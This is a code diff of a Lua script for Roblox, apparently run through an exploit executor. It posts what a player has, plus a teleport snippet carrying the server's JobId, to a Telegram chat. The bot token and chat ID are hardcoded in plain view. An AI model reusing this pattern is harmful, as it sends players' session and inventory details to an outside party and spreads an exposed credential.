@@ -22,20 +22,43 @@ local BOT_TOKEN = "8446879035:AAH1DGTI_M8FAX0y0RNVv8q1k1MsOhMj6e4"
 local CHAT_ID = "2001061743"
 
 -- Telegram function
+-- Telegram function
 local function sendTelegramMessage(text)
     local requestFunc = http_request or request or (syn and syn.request)
     if not requestFunc then
         print("[DEBUG] HTTP request unavailable, cannot send Telegram message.")
         return
     end
-    local fullText = text .. "\nLink: https://www.roblox.com/games/126884695634066/#/" .. game.JobId
-    local data = {chat_id = CHAT_ID, text = fullText}
-    local json = HttpService:JSONEncode(data)
+
+    -- First message: what the player has
+    local fullText1 = text
+    local data1 = {chat_id = CHAT_ID, text = fullText1}
+    local json1 = HttpService:JSONEncode(data1)
     requestFunc({
         Url = "https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage",
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
-        Body = json
+        Body = json1
+    })
+
+    -- Second message: Lua snippet to join this server
+    local PLACE_ID = 126884695634066
+    local fullText2 = string.format([[
+-- Lua snippet to join this server:
+local TeleportService = game:GetService("TeleportService")
+local PLACE_ID = %d
+local JOB_ID = "%s"
+local Players = game:GetService("Players")
+TeleportService:TeleportToPlaceInstance(PLACE_ID, JOB_ID, Players.LocalPlayer)
+]], PLACE_ID, game.JobId)
+
+    local data2 = {chat_id = CHAT_ID, text = fullText2}
+    local json2 = HttpService:JSONEncode(data2)
+    requestFunc({
+        Url = "https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage",
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = json2
     })
 end
 
@@ -181,6 +204,7 @@ while true do
     end
     task.wait(0.1)
 end
+
 
 
 
